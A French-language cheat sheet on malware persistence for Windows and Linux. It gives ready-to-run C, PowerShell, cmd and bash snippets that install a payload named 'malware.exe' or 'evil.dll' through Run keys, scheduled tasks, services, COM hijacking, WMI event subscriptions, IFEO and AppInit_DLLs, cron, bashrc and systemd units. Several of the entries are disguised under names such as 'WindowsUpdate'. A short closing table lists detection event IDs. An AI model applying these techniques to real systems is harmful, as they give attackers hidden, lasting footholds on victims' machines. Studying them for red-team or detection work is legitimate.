# Guide Persistence

## Techniques de persistence Windows

| Technique | Discrétion | Prérequis |
|-----------|------------|-----------|
| Run Keys | ⭐⭐ | User |
| Scheduled Tasks | ⭐⭐⭐ | User/Admin |
| Services | ⭐⭐⭐ | Admin |
| COM Hijacking | ⭐⭐⭐⭐ | User |
| DLL Hijacking | ⭐⭐⭐⭐ | User |
| WMI Event | ⭐⭐⭐⭐⭐ | Admin |
| Startup Folder | ⭐ | User |

---

## 1. Run Keys (Registry)

```c
void AddRunKey() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);
    
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    
    RegSetValueEx(hKey, "Updater", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);
}
```

```powershell
# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "Updater" -Value "C:\path\malware.exe"
```

---

## 2. Scheduled Tasks

```cmd
# Créer une tâche
schtasks /create /tn "WindowsUpdate" /tr "C:\path\malware.exe" `
    /sc onlogon /ru SYSTEM

# Avec XML (plus de contrôle)
schtasks /create /tn "Update" /xml task.xml
```

```c
// Via COM API
#include <taskschd.h>

void CreateScheduledTask() {
    ITaskService* pService;
    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);
    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    
    ITaskFolder* pFolder;
    pService->GetFolder(_bstr_t(L"\\"), &pFolder);
    
    ITaskDefinition* pTask;
    pService->NewTask(0, &pTask);
    
    // Configure triggers, actions...
    // ...
}
```

---

## 3. Services

```cmd
# Créer un service
sc create "WindowsUpdate" binPath= "C:\path\malware.exe" start= auto

# Configurer le recovery (restart on failure)
sc failure "WindowsUpdate" reset= 0 actions= restart/1000

# Démarrer
sc start "WindowsUpdate"
```

---

## 4. COM Hijacking

```
┌─────────────────────────────────────────────────────────────┐
│                        COM HIJACKING                        │
├─────────────────────────────────────────────────────────────┤
│  Remplacer une DLL COM légitime par la nôtre               │
│                                                              │
│  1. Trouver un CLSID utilisé au démarrage                   │
│  2. Créer la clé dans HKCU (priorité sur HKLM)              │
│  3. Pointer vers notre DLL                                  │
│                                                              │
│  HKCU\Software\Classes\CLSID\{GUID}\InprocServer32          │
│  (Default) = C:\path\evil.dll                               │
└─────────────────────────────────────────────────────────────┘
```

```powershell
# Exemple: hijack CLSID utilisé par explorer
$clsid = "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
    -Name "(Default)" -Value "C:\path\evil.dll"
```

---

## 5. WMI Event Subscription

```powershell
# Créer l'event filter (trigger)
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
    -Arguments @{
        Name = "UpdateFilter"
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
    }

# Créer le consumer (action)
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
    -Arguments @{
        Name = "UpdateConsumer"
        CommandLineTemplate = "C:\path\malware.exe"
    }

# Lier les deux
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
    -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }
```

---

## 6. Image File Execution Options

```
Débugger qui s'exécute à la place d'un programme
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe
    Debugger = C:\path\malware.exe
```

---

## 7. AppInit_DLLs

```
Charger une DLL dans tout process qui charge user32.dll
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
    AppInit_DLLs = C:\path\evil.dll
    LoadAppInit_DLLs = 1
```

---

## Linux Persistence

| Technique | Emplacement |
|-----------|-------------|
| Cron | /etc/crontab, /var/spool/cron |
| Bashrc | ~/.bashrc, ~/.profile |
| Systemd | /etc/systemd/system/ |
| Init.d | /etc/init.d/ |
| SSH keys | ~/.ssh/authorized_keys |
| LD_PRELOAD | /etc/ld.so.preload |

```bash
# Cron
echo "* * * * * /path/malware" >> /var/spool/cron/root

# Bashrc
echo "/path/malware &" >> ~/.bashrc

# Systemd service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/path/malware
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

---

## Détection

| Technique | Event ID / Indicateur |
|-----------|----------------------|
| Run Keys | Registry modification |
| Scheduled Task | Event 4698 |
| Service | Event 7045 |
| COM Hijack | HKCU CLSID creation |
| WMI Event | WMI-Activity logs |
